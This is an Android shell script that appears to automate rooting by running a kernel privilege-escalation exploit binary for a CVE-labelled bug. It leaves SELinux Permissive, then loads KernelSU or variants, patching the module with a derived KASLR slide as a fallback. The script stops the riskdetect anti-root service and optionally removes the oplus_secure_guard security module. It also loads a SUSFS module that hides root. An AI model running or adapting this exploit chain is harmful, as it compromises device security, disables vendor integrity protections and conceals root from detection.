#!/system/bin/sh
# PYB110 one-key flow, CVE-2026-98260 branch (t98260_plant + t98260_su).
D=${PYB110_DIR:-/data/local/tmp/pyb110}
cd "$D" || exit 1
chmod 755 t98260_plant t98260_su prep_patch ksu* ksud* 2>/dev/null

MANAGER=${PYB110_MANAGER:-kernelsu}
DISABLE_ANTIROOT=${PYB110_DISABLE_ANTIROOT:-1}
LATE_OK=0
UNLOAD_GUARD=${PYB110_UNLOAD_GUARD:-0}
case "$MANAGER" in
  finasu) BASE=ksu-base-finasu.ko; KSUD=ksud_finasu; MPKG=me.yuki.fina ;;
  next) BASE=ksu-base-next.ko; KSUD=ksud_next; MPKG=com.rifsxd.ksunext ;;
  bakasu) BASE=ksu-base-bakasu.ko; KSUD=ksud_bakasu; MPKG=com.resukisu.resukisu ;;
  sukisu) BASE=ksu-base-sukisu.ko; KSUD=ksud_sukisu; MPKG=com.sukisu.ultra ;;
  *) MANAGER=kernelsu; BASE=ksu-base.ko; KSUD=ksud_official; MPKG=me.weishu.kernelsu ;;
esac
MPKG=${PYB110_MANAGER_PKG:-$MPKG}
echo "EXPLOIT=98260 ENGINE=t98260 MANAGER=$MANAGER"

restore_screenshot_stack() {
  echo "SCREENSHOT_STACK: checking ColorOS screenshot components"
  if ! su -c true >/dev/null 2>&1; then
    echo "SCREENSHOT_STACK_SKIP=no-su"
    return 0
  fi
  DIS=$(su -c "pm list packages -d --user 0 2>/dev/null" 2>/dev/null | tr -d '\r')
  for p in com.oplus.exsystemservice com.oplus.screenshot; do
    if ! su -c "pm list packages '$p'" 2>/dev/null | grep -qx "package:$p"; then
      echo "SCREENSHOT_STACK_ABSENT=$p"
      continue
    fi
    if printf '%s\n' "$DIS" | grep -qx "package:$p"; then
      su -c "pm enable --user 0 '$p'" 2>&1
      echo "SCREENSHOT_STACK_ENABLED=$p rc=$?"
    else
      echo "SCREENSHOT_STACK_OK=$p"
    fi
  done
}

crown_dynamic_manager() {
  if [ "$MANAGER" != "finasu" ]; then
    return 0
  fi
  APKP=$(pm path me.yuki.fina 2>/dev/null | sed -n 's/^package://p' | head -n 1)
  if [ -z "$APKP" ]; then
    echo "DYNAMIC_MANAGER_NO_APK"
    return 0
  fi
  su -c "/data/adb/ksud dynamic set-apk '$APKP'" 2>&1
  echo "DYNAMIC_SET_APK_RC=$?"
  su -c "/data/adb/ksud dynamic list" 2>&1
  echo "DYNAMIC_LIST_RC=$?"
}

unload_guard() {
  if [ "$UNLOAD_GUARD" = "1" ]; then
    echo "UNLOAD_GUARD: rmmod oplus_secure_guard_new"
    su -c "rmmod oplus_secure_guard_new" 2>&1
    echo "UNLOAD_GUARD_RC=$?"
    if grep -qi oplus_secure_guard /proc/modules 2>/dev/null; then
      echo "UNLOAD_GUARD_STILL_LOADED"
    else
      echo "UNLOAD_GUARD_GONE"
    fi
  else
    echo "UNLOAD_GUARD_SKIP"
  fi
}

install_manager_apk() {
  APK=${PYB110_MANAGER_APK:-}
  if [ -n "$APK" ] && [ -f "$D/$APK" ]; then
    su -c "pm install -r '$D/$APK'" 2>&1
    echo "APK_INSTALL_RC=$?"
  fi
}

load_susfs() {
  if [ "${PYB110_SUSFS:-0}" != "1" ]; then
    echo "SUSFS_SKIP"
    return 0
  fi
  if [ ! -f "$D/susfs_guard_lkm.ko" ]; then
    echo "SUSFS_MISSING"
    return 0
  fi
  if su -c "test -d /sys/module/susfs_guard_lkm" 2>/dev/null; then
    echo "SUSFS_ALREADY"
    return 0
  fi
  loaded=0
  for c in "$D/$KSUD" /data/adb/ksud /data/adb/ksu/bin/ksud; do
    if ! su -c "test -x '$c'" 2>/dev/null; then continue; fi
    echo "SUSFS_INSMOD_TRY=$c"
    su -c "$c insmod '$D/susfs_guard_lkm.ko' expose_proc=1" 2>&1
    sleep 1
    if su -c "test -d /sys/module/susfs_guard_lkm" 2>/dev/null; then loaded=1; break; fi
  done
  if [ "$loaded" != "1" ]; then
    echo "SUSFS_INSMOD_FALLBACK=insmod"
    su -c "insmod '$D/susfs_guard_lkm.ko' expose_proc=1" 2>&1
    sleep 1
    if su -c "test -d /sys/module/susfs_guard_lkm" 2>/dev/null; then loaded=1; fi
  fi
  if [ "$loaded" = "1" ]; then
    echo "SUSFS_LOADED"
  else
    echo "SUSFS_LOAD_FAIL"
  fi
}

start_antiroot_guard() {
  if [ "$DISABLE_ANTIROOT" != "1" ]; then
    echo "ANTIROOT_SKIP: switch off; riskdetect not stopped"
    return 0
  fi
  setsid sh -c "
    n=0
    while [ \$n -lt 100 ]; do
      su -c 'stop riskdetect' >/dev/null 2>&1 && break
      sleep 0.1
      n=\$((n+1))
    done
    st=\$(su -c 'getprop init.svc.riskdetect' 2>/dev/null | tr -d '\r')
    echo \"ANTIROOT_STOPPED state=\$st\" >> '$D/antiroot.log'
  " >/dev/null 2>&1 &
  echo "ANTIROOT_GUARD_BG: stop riskdetect HAL requested (no restore; restored on reboot)"
}

wait_kernelsu() {
  n=0
  while [ $n -lt 50 ]; do
    grep -qi kernelsu /proc/modules 2>/dev/null && return 0
    sleep 0.1
    n=$((n+1))
  done
  return 1
}

wait_su() {
  n=0
  while [ $n -lt 50 ]; do
    if [ -x /system/bin/su ] && su -c true >/dev/null 2>&1; then return 0; fi
    sleep 0.1
    n=$((n+1))
  done
  return 1
}

finish_manager() {
  cp -f "$KSUD" /data/local/tmp/ksud_official 2>/dev/null
  unload_guard
  su -c "/data/local/tmp/ksud_official install" 2>&1
  echo "KSUD_INSTALL_RC=$?"
  install_manager_apk
  crown_dynamic_manager
  restore_screenshot_stack
  su -c "id; getenforce; grep -i kernelsu /proc/modules" 2>&1
  echo "SU_ID_RC=$?"
  if [ "$(su -c 'id -u' 2>/dev/null | tr -d '\r')" = "0" ]; then
    su -c "pkill -9 t98260_plant 2>/dev/null; rm -f /data/local/tmp/t98260-root.sock" 2>&1
    echo "ROOTD_CLEANED"
  else
    echo "ROOTD_KEPT: su unavailable; keeping rootd as fallback"
  fi
  load_susfs
  # ksud late-load already restarts the manager; a second force-stop/start
  # would flash its splash twice.
  if [ "$LATE_OK" = "1" ]; then
    n=0
    while [ $n -lt 15 ]; do
      pidof "$MPKG" >/dev/null 2>&1 && break
      sleep 0.1
      n=$((n+1))
    done
    if pidof "$MPKG" >/dev/null 2>&1; then
      echo "MANAGER_START=late-load"
      return 0
    fi
  fi
  am force-stop "$MPKG" 2>/dev/null
  ACT=$(cmd package resolve-activity --brief -a android.intent.action.MAIN -c android.intent.category.LAUNCHER "$MPKG" 2>/dev/null | tail -n 1)
  case "$ACT" in
    */*)
      am start -n "$ACT" 2>&1
      echo "MANAGER_START=$ACT"
      ;;
    *)
      echo "MANAGER_START_FALLBACK=monkey"
      monkey -p "$MPKG" -c android.intent.category.LAUNCHER 1 2>&1
      ;;
  esac
}

if grep -qi kernelsu /proc/modules 2>/dev/null; then
  echo "ALREADY_LOADED: kernelsu present, skip exploit/load"
  start_antiroot_guard
  wait_su || echo "SU_WAIT_TIMEOUT"
  finish_manager
  echo DONE
  exit 0
fi

echo "[1/4] probe"
./t98260_plant --probe > probe.log 2>&1
rc=$?
cat probe.log
if [ $rc -ne 0 ]; then
  echo "PROBE_FAIL rc=$rc"
  exit 11
fi

echo "[2/4] run t98260_plant (auto slide)"
if pidof t98260_plant >/dev/null 2>&1; then
  echo "STALE_PLANT: $(pidof t98260_plant); reboot before rerunning 98260 (avoid freeing the page-holding process)"
  exit 12
fi
rm -f plant.log t98260-root.sock
setsid sh -c "./t98260_plant --auto --budget 240 2>&1 | tee plant.log" &
sleep 0.1
echo "PLANT_PID=$(pidof t98260_plant) (SELinux becomes Permissive after a hit)"
ROOTED=0
i=0
while [ $i -lt 1100 ]; do
  if grep -q "ROOTD_READY" plant.log 2>/dev/null; then ROOTED=1; break; fi
  if grep -qE "FAIL=(task|selinux|cred|init|probe)" plant.log 2>/dev/null; then break; fi
  if grep -q "PARKED=1" plant.log 2>/dev/null; then break; fi
  if ! pidof t98260_plant >/dev/null 2>&1; then
    grep -q "ROOTD_READY" plant.log 2>/dev/null && ROOTED=1
    break
  fi
  sleep 0.3
  i=$((i+1))
done
if [ "$ROOTED" != "1" ] && grep -q "ROOTD_READY" plant.log 2>/dev/null; then
  ROOTED=1
fi
if [ "$ROOTED" != "1" ]; then
  echo "PLANT_FAIL (enforce=$(getenforce 2>/dev/null))"
  tail -n 15 plant.log 2>/dev/null
  exit 13
fi
if [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
  echo "PLANT_FAIL_ENFORCE: $(getenforce 2>/dev/null)"
  tail -n 15 plant.log 2>/dev/null
  exit 13
fi
echo "PLANT_OK: enforce=Permissive, rootd ready"

echo "[3/4] handoff to $MANAGER"
start_antiroot_guard
./t98260_su -c "$D/$KSUD late-load --kmi android17-6.18 --allow-shell --package-name $MPKG" 2>&1
wait_kernelsu && LATE_OK=1
if [ "$LATE_OK" != "1" ]; then
  echo "LATE_LOAD_RETRY: without --kmi"
  ./t98260_su -c "$D/$KSUD late-load --allow-shell --package-name $MPKG" 2>&1
  wait_kernelsu && LATE_OK=1
fi
if [ "$LATE_OK" != "1" ]; then
  echo "LATE_LOAD_FAIL: fallback to insmod ($BASE)"
  SLIDE=$(sed -n 's/.*SLIDE_DERIVED=0x\([0-9a-f]*\).*/0x\1/p' plant.log 2>/dev/null | tail -n 1)
  if [ -z "$SLIDE" ]; then
    echo "PATCH_FAIL: no slide"
    exit 14
  fi
  echo "SLIDE=$SLIDE"
  ./prep_patch "$BASE" syms.txt "$SLIDE" ksu-98260.ko || { echo "PATCH_FAIL"; exit 14; }
  ./t98260_su -c "insmod $D/ksu-98260.ko" 2>&1
  echo "INSMOD_RC=$?"
fi
if ! wait_kernelsu; then
  echo "LOAD_FAIL"
  exit 15
fi
echo "MODULE_LOADED"
wait_su || echo "SU_WAIT_TIMEOUT"

echo "[4/4] manager setup"
finish_manager
echo DONE
